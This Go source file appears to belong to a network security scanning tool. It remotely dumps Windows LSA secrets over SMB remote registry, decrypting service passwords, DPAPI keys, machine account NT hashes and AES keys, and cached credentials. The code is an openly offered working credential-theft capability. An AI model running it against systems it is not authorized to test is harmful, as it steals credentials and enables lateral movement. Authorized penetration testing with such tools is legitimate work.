package smb

import (
	"bytes"
	"context"
	"crypto/md5"
	"crypto/rc4"
	"encoding/binary"
	"fmt"
	"strings"

	smbfern "github.com/Method-Security/networkscan/generated/go/common/smb"
	gosmb "github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/dcerpc/msrrp"
	"github.com/jfjallid/go-smb/smb/encoder"
	svc1log "github.com/palantir/witchcraft-go-logging/wlog/svclog/svc1log"
	"golang.org/x/crypto/md4"
)

// LSA secret data structures
type lsaSecret struct {
	Version       uint32
	EncKeyID      string // 16 bytes
	EncAlgorithm  uint32
	Flags         uint32
	EncryptedData []byte
}

func (l *lsaSecret) unmarshal(data []byte) {
	l.Version = binary.LittleEndian.Uint32(data[:4])
	l.EncKeyID = string(data[4:20])
	l.EncAlgorithm = binary.LittleEndian.Uint32(data[20:24])
	l.Flags = binary.LittleEndian.Uint32(data[24:28])
	l.EncryptedData = data[28:]
}

type lsaSecretBlob struct {
	Length  uint32
	Unknown [12]byte
	Secret  []byte
}

func (l *lsaSecretBlob) unmarshal(data []byte) {
	l.Length = binary.LittleEndian.Uint32(data[:4])
	copy(l.Unknown[:], data[4:16])
	l.Secret = data[16 : 16+l.Length]
}

type dpapiSystem struct {
	Version    uint32
	MachineKey [20]byte
	UserKey    [20]byte
}

func (d *dpapiSystem) unmarshal(data []byte) {
	d.Version = binary.LittleEndian.Uint32(data[:4])
	copy(d.MachineKey[:], data[4:24])
	copy(d.UserKey[:], data[24:44])
}

type PrintableLSASecret struct {
	secretType  string
	secrets     []string
	extraSecret string
}

// LSASecret represents an LSA secret extracted from the registry
type LSASecret struct {
	Name        string
	Secret      string
	Description string
}

// DecryptLSAKey decrypts the LSA key from registry data
func DecryptLSAKey(rpccon *msrrp.RPCCon, base []byte, data []byte) ([]byte, error) {
	_, err := GetBootKey(rpccon, base)
	if err != nil {
		return nil, err
	}
	var plaintext []byte
	if VistaStyle {
		lsaSecret := &lsaSecret{}
		lsaSecret.unmarshal(data)
		encryptedData := lsaSecret.EncryptedData
		tmpkey := SHA256(BootKey, encryptedData[:32], 0)
		plaintext, err = DecryptAES(tmpkey, encryptedData[32:], nil)
		if err != nil {
			return nil, err
		}
		lsaSecretBlob := &lsaSecretBlob{}
		lsaSecretBlob.unmarshal(plaintext)
		return lsaSecretBlob.Secret[52:][:32], nil
	}
	// Windows XP
	h := md5.New()
	h.Write(BootKey)
	for i := 0; i < 1000; i++ {
		h.Write(data[60:76])
	}
	tmpkey := h.Sum(nil)
	c1, err := rc4.NewCipher(tmpkey[:])
	if err != nil {
		return nil, err
	}
	plaintext = make([]byte, 48)
	c1.XORKeyStream(plaintext, data[12:60])
	return plaintext[0x10:0x20], nil
}

// GetLSASecretKey extracts the LSA secret encryption key
func GetLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) ([]byte, error) {
	if len(LSAKey) > 0 {
		return LSAKey, nil
	}

	VistaStyle = true
	var data []byte
	var hSubKey []byte
	var err error

	if modifyDacl {
		hSubKey, err = rpccon.OpenSubKey(base, `Security\Policy\PolEKList`)
	} else {
		hSubKey, err = rpccon.OpenSubKeyExt(base, `Security\Policy\PolEKList`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		if err.Error() == "ERROR_FILE_NOT_FOUND" {
			VistaStyle = false
		} else {
			return nil, err
		}
	}
	if VistaStyle {
		data, _, err = rpccon.QueryValue2(hSubKey, "")
		if err != nil {
			_ = rpccon.CloseKeyHandle(hSubKey)
			return nil, err
		}
		_ = rpccon.CloseKeyHandle(hSubKey)
	}

	if !VistaStyle {
		if modifyDacl {
			hSubKey, err = rpccon.OpenSubKey(base, `Security\Policy\PolSecretEncryptionKey`)
		} else {
			hSubKey, err = rpccon.OpenSubKeyExt(base, `Security\Policy\PolSecretEncryptionKey`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
		}
		if err != nil {
			return nil, err
		}
		data, _, err = rpccon.QueryValue2(hSubKey, "")
		if err != nil {
			_ = rpccon.CloseKeyHandle(hSubKey)
			return nil, err
		}
		_ = rpccon.CloseKeyHandle(hSubKey)
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("failed to get LSA key")
	}

	result, err := DecryptLSAKey(rpccon, base, data)
	if err != nil {
		return nil, err
	}
	LSAKey = make([]byte, 32)
	copy(LSAKey, result)
	return result, nil
}

// GetServiceUser retrieves the service user account from registry
func GetServiceUser(rpccon *msrrp.RPCCon, base []byte, name string) (string, error) {
	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Services\`+name)
	if err != nil {
		return "", err
	}
	defer func() { _ = rpccon.CloseKeyHandle(hSubKey) }()
	return rpccon.QueryValueString(hSubKey, "ObjectName")
}

// GetHostnameAndDomain retrieves hostname and domain from registry
func GetHostnameAndDomain(rpccon *msrrp.RPCCon, base []byte) (hostname, domain string, err error) {
	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`)
	if err != nil {
		return "", "", err
	}
	defer func(h []byte) {
		_ = rpccon.CloseKeyHandle(h)
	}(hSubKey)

	domain, err = rpccon.QueryValueString(hSubKey, "Domain")
	if err != nil {
		return "", "", err
	}

	hostname, err = rpccon.QueryValueString(hSubKey, "Hostname")
	if err != nil {
		return "", "", err
	}
	return hostname, domain, nil
}

// ParseSecret parses and formats LSA secrets based on their type
func ParseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []byte) (*PrintableLSASecret, error) {
	if len(secretItem) == 0 {
		return nil, nil
	}
	if bytes.Compare(secretItem[:2], []byte{0, 0}) == 0 {
		return nil, nil
	}

	secret := ""
	extrasecret := ""
	upperName := strings.ToUpper(name)
	result := &PrintableLSASecret{}
	result.secretType = "[*] " + name

	if strings.HasPrefix(upperName, "_SC_") {
		secretDecoded, err := encoder.FromUnicodeString(secretItem)
		if err != nil {
			return nil, err
		}
		svcUser, err := GetServiceUser(rpccon, base, name[4:])
		if err != nil {
			svcUser = "(unknown user)"
		} else {
			if strings.HasPrefix(svcUser, ".\\") {
				svcUser = svcUser[2:]
			}
		}
		secret = fmt.Sprintf("%s: %s", svcUser, secretDecoded)
		result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "ASPNET_WP_PASSWORD") {
		secretDecoded, err := encoder.FromUnicodeString(secretItem)
		if err != nil {
			return nil, err
		}
		secret = fmt.Sprintf("ASPNET: %s", secretDecoded)
		result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "DPAPI_SYSTEM") {
		dpapi := &dpapiSystem{}
		dpapi.unmarshal(secretItem)
		secret = fmt.Sprintf("dpapi_machinekey: 0x%x", dpapi.MachineKey)
		secret2 := fmt.Sprintf("dpapi_userkey: 0x%x", dpapi.UserKey)
		result.secrets = append(result.secrets, secret)
		result.secrets = append(result.secrets, secret2)
	} else if strings.HasPrefix(upperName, "$MACHINE.ACC") {
		printname := "$MACHINE.ACC"

		// Calculate NT hash using MD4
		h := md4.New()
		h.Write(secretItem)
		ntHash := h.Sum(nil)
		secret = fmt.Sprintf("$MACHINE.ACC (NT Hash): %x", ntHash)
		result.secrets = append(result.secrets, secret)

		// Get hostname and domain for AES key calculation
		hostname, domain, err := GetHostnameAndDomain(rpccon, base)
		if err == nil && domain != "" {
			aes128Key, aes256Key, err := CalcMachineAESKeys(hostname, domain, secretItem)
			if err == nil {
				aes128Secret := fmt.Sprintf("%s:AES_128_key:%x", printname, aes128Key)
				aes256Secret := fmt.Sprintf("%s:AES_256_key:%x", printname, aes256Key)
				result.secrets = append(result.secrets, aes128Secret)
				result.secrets = append(result.secrets, aes256Secret)
			}
		}

		// Always include plain password hex
		extrasecret = fmt.Sprintf("%s:plain_password_hex:%x", printname, secretItem)
		result.extraSecret = extrasecret
	} else if strings.HasPrefix(upperName, "NL$KM") {
		secret = fmt.Sprintf("NL$KM: 0x%x", secretItem[:16])
		result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "CACHEDDEFAULTPASSWORD") {
		secretDecoded, err := encoder.FromUnicodeString(secretItem)
		if err != nil {
			return nil, err
		}
		username := "(Unknown user)"
		secret = fmt.Sprintf("%s: %s", username, secretDecoded)
		result.secrets = append(result.secrets, secret)
	}
	return result, nil
}

// GetLSASecrets extracts LSA secrets from the registry
func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history, modifyDacl bool) ([]PrintableLSASecret, error) {
	secretsPath := `SECURITY\Policy\Secrets`
	var keys []string
	var err error

	if modifyDacl {
		keys, err = rpccon.GetSubKeyNames(base, secretsPath)
	} else {
		keys, err = rpccon.GetSubKeyNamesExt(base, secretsPath, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		return nil, err
	}

	if len(keys) == 0 {
		return nil, nil
	}

	_, err = GetLSASecretKey(rpccon, base, modifyDacl)
	if err != nil {
		return nil, err
	}

	var secrets []PrintableLSASecret
	for _, key := range keys {
		if key == "NL$Control" {
			continue
		}
		valueTypeList := []string{"CurrVal"}
		if history {
			valueTypeList = append(valueTypeList, "OldVal")
		}
		var secret []byte
		for _, valueType := range valueTypeList {
			var hSubKey []byte
			if modifyDacl {
				hSubKey, err = rpccon.OpenSubKey(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType))
			} else {
				hSubKey, err = rpccon.OpenSubKeyExt(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType), msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
			}
			if err != nil {
				return nil, err
			}

			value, _, err := rpccon.QueryValue2(hSubKey, "")
			if err != nil {
				_ = rpccon.CloseKeyHandle(hSubKey)
				continue
			}
			_ = rpccon.CloseKeyHandle(hSubKey)

			if (len(value) != 0) && (value[0] == 0x0) {
				if VistaStyle {
					record := &lsaSecret{}
					record.unmarshal(value)
					tmpKey := SHA256(LSAKey, record.EncryptedData[:32], 0)
					plainText, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
					if err != nil {
						continue
					}
					record2 := &lsaSecretBlob{}
					record2.unmarshal(plainText)
					secret = record2.Secret
				} else {
					continue
				}
				if valueType == "OldVal" {
					key += "_history"
				}
				ps, err := ParseSecret(rpccon, base, key, secret)
				if err != nil {
					continue
				} else if ps == nil {
					continue
				}
				secrets = append(secrets, *ps)
			}
		}
	}
	return secrets, nil
}

// DumpLSASecrets performs LSA secrets dumping from registry
func DumpLSASecrets(ctx context.Context, rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) ([]*smbfern.LsaSecret, []string, error) {
	log := svc1log.FromContext(ctx)
	var results []*smbfern.LsaSecret
	var errors []string

	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false, modifyDacl)
	if err != nil {
		errors = append(errors, fmt.Sprintf("Failed to get LSA secrets: %v", err))
		return results, errors, err
	}

	for _, secret := range lsaSecrets {
		var entries []*smbfern.LsaSecretEntry

		// Convert secrets to key-value entries
		for _, secretStr := range secret.secrets {
			// Handle different formats of secrets
			if strings.Contains(secretStr, ":") {
				// Try different separators - first ": " (space after colon)
				if strings.Contains(secretStr, ": ") {
					parts := strings.SplitN(secretStr, ": ", 2)
					entries = append(entries, &smbfern.LsaSecretEntry{
						Key:   parts[0],
						Value: parts[1],
					})
				} else {
					// Handle format like "$MACHINE.ACC:AES_128_key:value"
					// Split into maximum 3 parts: prefix, key_type, value
					parts := strings.SplitN(secretStr, ":", 3)
					if len(parts) == 3 {
						// Format: $MACHINE.ACC:AES_128_key:value
						key := parts[0] + ":" + parts[1] // e.g., "$MACHINE.ACC:AES_128_key"
						value := parts[2]
						entries = append(entries, &smbfern.LsaSecretEntry{
							Key:   key,
							Value: value,
						})
					} else if len(parts) == 2 {
						// Format: key:value
						entries = append(entries, &smbfern.LsaSecretEntry{
							Key:   parts[0],
							Value: parts[1],
						})
					} else {
						entries = append(entries, &smbfern.LsaSecretEntry{
							Key:   "",
							Value: secretStr,
						})
					}
				}
			} else {
				// If no colon, use the whole string as value with empty key
				entries = append(entries, &smbfern.LsaSecretEntry{
					Key:   "",
					Value: secretStr,
				})
			}
		}

		// Add extra secret as separate entry if present
		if secret.extraSecret != "" {
			// Handle format like "$MACHINE.ACC:plain_password_hex:value"
			parts := strings.SplitN(secret.extraSecret, ":", 3)
			if len(parts) == 3 {
				// Format: $MACHINE.ACC:plain_password_hex:value
				key := parts[0] + ":" + parts[1] // e.g., "$MACHINE.ACC:plain_password_hex"
				value := parts[2]
				entries = append(entries, &smbfern.LsaSecretEntry{
					Key:   key,
					Value: value,
				})
			} else if len(parts) == 2 {
				entries = append(entries, &smbfern.LsaSecretEntry{
					Key:   parts[0],
					Value: parts[1],
				})
			} else {
				entries = append(entries, &smbfern.LsaSecretEntry{
					Key:   "",
					Value: secret.extraSecret,
				})
			}
		}

		lsaSecret := &smbfern.LsaSecret{
			Name:    secret.secretType,
			Entries: entries,
		}
		results = append(results, lsaSecret)

		log.Info("Extracted LSA secret",
			svc1log.SafeParam("secretName", secret.secretType),
			svc1log.SafeParam("entryCount", len(entries)))
	}

	return results, errors, nil
}

// ExtractLSASecrets extracts LSA secrets from the SECURITY registry hive
func ExtractLSASecrets(session *gosmb.Connection) ([]LSASecret, error) {
	var secrets []LSASecret

	// TODO: Implement LSA secret extraction
	// This requires:
	// 1. Opening HKLM\SECURITY registry key
	// 2. Extracting LSA encryption keys
	// 3. Decrypting stored secrets like service account passwords

	// Example structure
	secrets = append(secrets, LSASecret{
		Name:        "DefaultPassword",
		Secret:      "placeholder_secret",
		Description: "Example LSA secret",
	})

	return secrets, nil
}
